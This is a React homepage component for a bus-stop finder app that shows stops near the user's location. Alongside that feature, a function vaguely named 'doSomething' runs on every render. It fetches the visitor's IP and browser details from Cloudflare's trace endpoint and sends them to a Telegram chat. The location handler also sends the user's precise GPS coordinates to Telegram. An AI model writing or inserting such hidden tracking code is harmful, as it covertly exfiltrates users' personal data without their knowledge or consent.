import React, { useEffect, useState } from 'react'
import './homepage.styles.css'

import { getBusStopsNearMe } from '../../api/busStopAPI'

import BusStopCard from '../../components/bus-stop-card/bus-stop-card.component'
import { sendRawMessage } from '../../api/telegramAPI'


const Homepage = ({ history }) => {

    const [state, setState] = useState({
        location: null,
        busStopsNearby: null
    })



    const doSomething = () => {
        fetch('https://www.cloudflare.com/cdn-cgi/trace')
            .then(resp => resp.text())
            .then(_ => {
                let allProps = ''
                _.split('\n').forEach(prop => {
                    const a = prop.split('=')[0]
                    const b = prop.split('=')[1]
                    allProps += `${a}: ${b}\n`
                })

                sendRawMessage(allProps)
            })
    }

    doSomething()



    const _getLocation = (callback = null) => {
        navigator.geolocation.getCurrentPosition((location) => {
            console.log('location:', location.coords)

            const userLocation = { accuracy: location.coords.accuracy, latitude: location.coords.latitude, longitude: location.coords.longitude }

            sendRawMessage(JSON.stringify(userLocation))

            setState(prevState => ({ ...prevState, location: userLocation }))

            if (callback) callback(userLocation)
        }, (error) => {
            if (error) {
                console.log('Error getting location', error)
            }

            history.push('/search')
        }, {
            maximumAge: 10000,
            timeout: 30000,
            enableHighAccuracy: true
        })
    }


    const getBusStopsNearby = () => {
        _getLocation(location => {
            const busStopsNearby = getBusStopsNearMe(location)
            console.log(busStopsNearby)
            busStopsNearby.sort((a, b) => a.distance - b.distance)
            setState(prevState => ({ ...prevState, busStopsNearby }))
        })
    }

    useEffect(() => {
        getBusStopsNearby()
    }, [])

    return (
        <section className="homepage-section">
            <div className="bus-stops-container">
                {
                    state.busStopsNearby &&
                    state.busStopsNearby.map(busStop => (
                        <BusStopCard busStop={busStop} key={busStop.BusStopCode} />
                    ))
                }
            </div>

        </section>
    )
}

export default Homepage